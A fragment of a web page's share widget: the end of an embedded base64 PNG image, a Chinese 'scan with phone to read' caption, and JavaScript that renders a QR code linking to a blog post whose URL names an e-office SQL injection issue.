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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-system-workflow-flow\_type-flow\_xml-SORT\_ID-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 